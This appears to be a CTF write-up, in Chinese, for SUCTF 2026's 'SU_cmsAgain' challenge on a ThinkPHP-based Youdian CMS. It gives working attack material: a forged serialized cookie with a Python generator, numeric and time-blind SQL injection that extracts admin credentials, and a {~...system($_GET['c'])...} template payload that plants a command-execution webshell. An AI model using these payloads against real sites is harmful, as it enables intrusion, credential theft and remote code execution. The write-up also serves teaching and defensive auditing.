# SUCTF 2026 - SU_cmsAgain

## 题目简述

题目给出一套基于旧版 ThinkPHP 的友点 CMS 源码。官方仓库中的单题 writeup 只有归档说明，未提供解法；结合源码与总 PDF，可以还原出一条完整的前台到后台利用链：

```text
购物车 Cookie 反序列化
  -> ProductID 数值型 SQL 注入
  -> 读取后台管理员凭据
  -> 登录后台“装扮/自定义代码”功能
  -> 用 ThinkPHP 的 {~...} 标签绕过检查
  -> 前台模板包含恶意片段并执行 PHP
  -> 读取 flag
```

这里的 `unserialize()` 本身不是为了构造对象注入；攻击者只需伪造序列化数组，控制后续拼入 SQL 的 `ProductID`。

## 解题过程

### 1. 伪造购物车 Cookie

`App/Lib/Common/YdCart.class.php` 定义购物车逻辑：

```php
private $cookieName = 'y_shopping_cart';

$data = cookie($this->cookieName);
$data = unserialize(stripslashes($data));
```

应用配置另有：

```php
'COOKIE_PREFIX' => 'youdian',
```

ThinkPHP 的 `cookie()` 会把前缀和逻辑名称直接拼接，所以实际 Cookie 名是：

```text
youdiany_shopping_cart
```

未登录用户的购物车完全来自该 Cookie。构造时必须使用 PHP 序列化格式，并让字符串字段声明长度与字节长度一致；否则 `unserialize()` 会失败。

### 2. `ProductID` 进入 SQL

同一文件的 `getTotalPrice($id)` 从反序列化数组中取出商品编号：

```php
$InfoID = $data[$id]['ProductID'];
$InfoPrice = $m->where("InfoID=$InfoID")->getField('InfoPrice');
```

`App/Lib/Action/Home/PublicAction.class.php` 的 `setQuantity()` 会先更新购物车数量，再调用：

```php
$p['TotalItemPrice'] = $cart->getTotalPrice($id);
```

因此以下接口可以稳定触发注入：

```text
GET /index.php/Home/Public/setQuantity?id=1&quantity=1
Cookie: youdiany_shopping_cart=<URL 编码后的 PHP 序列化数据>
```

最小数组骨架为：

```text
a:1:{i:1;a:4:{
  s:6:"CartID";i:1;
  s:9:"ProductID";s:<LEN>:"<SQL>";
  s:15:"ProductQuantity";i:1;
  s:16:"AttributeValueID";s:0:"";
}}
```

先用数值型 UNION 验证：

```sql
0 UNION SELECT 123#
```

成功时 JSON 响应中的 `TotalItemPrice` 会变为 `123.00` 左右，说明返回列数与数据流都正确。生成 Cookie 时不要手写 `LEN`，应按 payload 的实际字节数计算：

```python
import urllib.parse

def cart_cookie(sql: str) -> str:
    raw = (
        'a:1:{i:1;a:4:{'
        's:6:"CartID";i:1;'
        f's:9:"ProductID";s:{len(sql.encode())}:"{sql}";'
        's:15:"ProductQuantity";i:1;'
        's:16:"AttributeValueID";s:0:"";'
        '}}'
    )
    return urllib.parse.quote(raw, safe='')
```

### 3. 读取后台凭据

若 UNION 回显不便，可令 `ProductID` 为时间盲注表达式：

```sql
IF((<condition>),SLEEP(0.6),1)
```

先二分长度，再逐字符二分 ASCII。需要提取的核心数据是：

```sql
SELECT AdminName FROM youdian_admin LIMIT 1
SELECT AdminPassword FROM youdian_admin LIMIT 1
```

当前归档的 `db.sql` 说明 `AdminPassword` 是明文，而 `yd_password_verify()` 也直接执行严格字符串比较，不存在额外哈希破解步骤。后台登录接口却对请求格式做了两层包装：

- `username` 传管理员名的 MD5；`getRealAdminName()` 会遍历数据库并匹配 MD5；
- `password` 先 URL 编码、Base64 编码，再在首尾各加 6 个任意字母数字；`yd_safe_decode()` 会去掉这 12 个字符后反向解码。

对应登录入口为：

```text
POST /index.php/Admin/Public/checkLogin/
```

返回 JSON 的 `status` 为 `3` 表示登录成功。不要把比赛实例的固定账号、口令或地址硬编码进长期脚本，应直接使用本轮 SQL 注入得到的结果。

### 4. 后台模板检查遗漏 `{~...}`

登录后，“装扮”功能由 `DecorationAction::saveCode()` 保存自定义代码：

```php
$fileName = "{$TemplatePath}Public/code.html";
$content = stripslashes($_POST['Content']);
$content = strip_tags($content, '<style><script><br>');
$result = YdInput::checkTemplateContent($content);
```

函数还显式拒绝 `<php>`、`</php>`、`{:`、`{$` 和 `sqllist`。看似严格，但 `checkTemplateContent()` 的正则只匹配 `{$...}` 与 `{:...}`：

```php
$pattern = '/{[$:]{1}([\s\S]+?)}/i';
```

它没有检查 ThinkPHP 的执行标签 `{~...}`。模板解析器 `ThinkTemplate::parseTag()` 对该分支的处理是：

```php
} elseif ('~' == $flag) {
    return '<?php '.$name.';?>';
}
```

同时模板行为配置为：

```php
'TMPL_DENY_FUNC_LIST' => 'echo,exit',
'TMPL_DENY_PHP'       => false,
```

所以可写入一个带输出边界的最小 payload：

```text
{~print("CMDOUT_BEGIN\n");system($_GET["c"]);print("\nCMDOUT_END");}
```

`strip_tags()` 不会删除这段模板语法，两个黑名单也都不会命中。

### 5. 为什么后台写入会在前台执行

`saveCode()` 把内容写到当前模板的 `Public/code.html`，而前台页脚 `App/Tpl/Home/Default/Public/footer.html` 明确包含它：

```html
<include file="Public:code" />
```

保存后访问首页并传入命令即可触发：

```text
GET /?c=id
```

实际利用时应先调用后台 `getCode` 备份原内容，执行完毕后再通过 `saveCode` 恢复，避免永久破坏实例。当前仓库的 `env/start.sh` 执行 `echo $FLAG > /flag`，所以与这份源码一致的读取命令是 `cat /flag`。总 PDF 展示的是比赛部署中的随机根目录文件名；如果现场环境不同，应先用最小范围的 `find`/`ls` 确认，不能把 PDF 中的临时文件名当成通用路径。

### 6. 最小自动化顺序

```text
1. 构造序列化购物车 Cookie，用 UNION 常量确认注入；
2. 用布尔/时间盲注提取 youdian_admin 的首个账号与口令；
3. 按 yd_safe_decode 的逆过程编码登录参数；
4. 登录后 getCode 备份 Public/code.html；
5. saveCode 写入 {~system(...)}；
6. 请求前台执行命令并读取 /flag；
7. 在 finally 中恢复原模板内容。
```

## 方法总结

- 反序列化数据即使不形成对象注入，只要进入其它危险解释器，也可能成为利用链入口；本题的决定性 sink 是 `where("InfoID=$InfoID")`。
- 审计大型 CMS 时应沿“可控数据 → 解析/拼接 → 可观测接口”缩小范围。本题无需遍历全部源码，购物车价格接口已经同时提供输入点、SQL sink 和回显。
- 后台模板功能不能只拦截 PHP 标签或少数模板前缀；必须按模板引擎支持的完整语法做白名单处理。遗漏 `{~...}` 会把合法管理功能直接变成 PHP 执行。
- 利用脚本要备份并恢复被修改的模板；题解中的实例地址、临时凭据和随机 flag 路径不应固化为可复用事实。
